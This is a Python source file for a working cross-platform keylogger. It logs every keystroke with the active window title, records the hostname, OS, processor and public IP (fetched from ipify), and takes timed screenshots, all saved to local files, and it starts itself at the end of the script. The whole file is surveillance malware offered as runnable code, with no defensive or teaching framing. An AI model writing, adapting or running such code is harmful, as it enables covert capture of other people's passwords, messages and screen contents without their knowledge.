from pynput.keyboard import Listener, Key
import socket
import platform
import requests
from PIL import ImageGrab
from pathlib import Path
import os
import time
import subprocess
from datetime import datetime

# Configuration constants
LOGGER_OUTPUT = "logger.txt"
COMPUTER_INFORMATION = "computer_information.txt"
SCREENSHOT_DIRECTORY = "screenshots"
SCREENSHOT_COUNT = 10
SCREENSHOT_INTERVAL = 10

# Create screenshots directory if it doesn't exist
if not os.path.exists(SCREENSHOT_DIRECTORY):
    os.mkdir(SCREENSHOT_DIRECTORY)


class KeyLogger:
    def __init__(self, interval=0):
        self.LOGGER_OUTPUT = LOGGER_OUTPUT
        self.COMPUTER_INFORMATION = COMPUTER_INFORMATION
        self.SCREENSHOT_DIRECTORY = SCREENSHOT_DIRECTORY
        self.interval = interval
    
    def on_press(self, key):
        """Handle key press events and log them with the active window title"""
        current_window = self.get_active_window()

        # Format special keys for better readability
        with open(self.LOGGER_OUTPUT, "a") as f:
            key_str = key
            if key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "\n" 
            elif key == Key.tab:
                key_str = "\t"
            
            # Log the key with the window title
            f.write(f"{current_window} - {key_str}\n")

    def get_computer_information(self):
        """Collect and log system information"""
        with open(self.COMPUTER_INFORMATION, "a") as f:
            hostname = socket.gethostname()

            try:
                public_ip = requests.get("https://api.ipify.org?format=json").json()
                f.write(f'\nPublic IP: {public_ip["ip"]}\n')
            except:
                f.write(f'\nPublic IP: Could not be retrieved\n')
                
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Operating System: {platform.system()} {platform.version()}\n')
            f.write(f'Processor: {platform.processor()}\n')

    def make_screenshot(self):
        """Capture and save a screenshot with timestamp"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = Path(__file__).parent.joinpath(
                self.SCREENSHOT_DIRECTORY, 
                f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_screenshot.png"
            )
            screenshot.save(screenshot_path)
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    def run(self):
        """Main method to start the keylogger"""
        self.get_computer_information()
        with Listener(on_press=self.on_press) as listener:
            self.take_screenshot()
            listener.join()

    def take_screenshot(self):
        """Take multiple screenshots at set intervals"""
        for i in range(SCREENSHOT_COUNT):
            self.make_screenshot()
            time.sleep(SCREENSHOT_INTERVAL)

    def get_active_window(self):
        """Get the title of the currently active window based on OS"""
        title = "Unknown Window"

        if platform.system() == "Windows":
            try:
                import win32gui

                title = win32gui.GetWindowText(win32gui.GetForegroundWindow())

                if not title:
                    title = "Unknown Window"
            except ImportError:
                title = "Could not get window title (win32gui not available)"
        
        elif platform.system() == "Darwin":  # macOS
            try:
                result = subprocess.run(
                    ['osascript', '-e', 'tell application "System Events" to get name of first application process whose frontmost is true'], 
                    capture_output=True, 
                    text=True
                )

                if result.returncode == 0 and result.stdout.strip():
                    title = result.stdout.strip()
                else:
                    title = "Unknown Window"
            except Exception:
                title = "Could not get window title on macOS"
        
        else:  # Linux
            try:
                from Xlib import display
                d = display.Display()
                window = d.get_input_focus().focus
                window_name = window.get_name()
                d.close()
                
                if window_name:
                    title = window_name
            except Exception:
                title = "Could not get window title on Linux"
        
        return title


keylogger = KeyLogger()
keylogger.run()

            
